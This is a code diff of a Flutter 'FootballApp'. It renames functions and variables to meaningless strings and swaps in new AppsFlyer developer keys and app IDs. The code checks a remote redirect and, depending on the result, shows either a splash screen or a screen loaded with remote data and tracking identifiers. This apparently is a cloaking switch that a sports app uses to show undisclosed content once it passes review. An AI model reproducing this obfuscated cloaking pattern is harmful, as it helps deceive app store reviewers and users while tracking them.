@@ -19,18 +19,18 @@ class _FootballAppState extends State<FootballApp> {
     return MaterialApp(
       debugShowCheckedModeBanner: false,
       home: FutureBuilder<bool>(
-        future: fetchnews(),
+        future: fsdfvdfcfdsgfsdg(),
         builder: (context, snapshot) {
           if (snapshot.connectionState == ConnectionState.waiting) {
             return Container(
               color: Colors.black,
             );
           } else {
-            if (snapshot.data == true && fdsgsd != '') {
-              return PolicyScreen(
-                dataForPage: fdsgsd,
-                par1: dexsc,
-                apxId: adId,
+            if (snapshot.data == true && condxa != '') {
+              return TermsAndConditions(
+                termsxa: condxa,
+                maxsad: fdsfds,
+                fdsmkfds: midoasdsa,
               );
             } else {
               return SplashScreen();
@@ -42,19 +42,19 @@ class _FootballAppState extends State<FootballApp> {
   }
 }
 
-String fdsgsd = '';
+String condxa = '';
 late AppsflyerSdk _appsflyerSdk;
 bool stat = false;
-String dexsc = '';
+String fdsfds = '';
 String authxa = '';
 Map _deepLinkData = {};
 Map _gcd = {};
 bool _isFirstLaunch = false;
 String _afStatus = '';
 String _campaign = '';
-String adId = '';
+String midoasdsa = '';
 String _campaignId = '';
-Future<bool> fetchnews() async {
+Future<bool> fsdfvdfcfdsgfsdg() async {
   final gazel = FirebaseRemoteConfig.instance;
   await gazel.fetchAndActivate();
   await initAppsflyerSdk();
@@ -68,7 +68,7 @@ Future<bool> fetchnews() async {
     ytrfterfwe.followRedirects = false;
     final response = await ytrfterfwe.close();
     if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
-      fdsgsd = dsdfdsfgdg;
+      condxa = dsdfdsfgdg;
       return true;
     }
   }
@@ -78,8 +78,8 @@ Future<bool> fetchnews() async {
 Future<void> initAppsflyerSdk() async {
   final AppsFlyerOptions options = AppsFlyerOptions(
     showDebug: false,
-    afDevKey: 'XFtWP6JvpRRFdnypp4woCV',
-    appId: '6499316167',
+    afDevKey: 'EjB2oxnrzjoLfcdgoJtWFh',
+    appId: '6504202820',
     timeToWaitForATTUserAuthorization: 15,
     disableAdvertisingIdentifier: false,
     disableCollectASA: false,
@@ -111,7 +111,7 @@ Future<void> initAppsflyerSdk() async {
     _gcd = res;
     _isFirstLaunch = res['payload']['is_first_launch'];
     _afStatus = res['payload']['af_status'];
-    dexsc = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
+    fdsfds = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
   });
 
   _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
@@ -144,8 +144,8 @@ Future<void> initAppsflyerSdk() async {
 
 Future<void> fetchDatax() async {
   try {
-    adId = await _appsflyerSdk.getAppsFlyerUID() ?? '';
-    print("AppsFlyer ID: $adId");
+    midoasdsa = await _appsflyerSdk.getAppsFlyerUID() ?? '';
+    print("AppsFlyer ID: $midoasdsa");
   } catch (e) {
     print("Failed to get AppsFlyer ID: $e");
   }
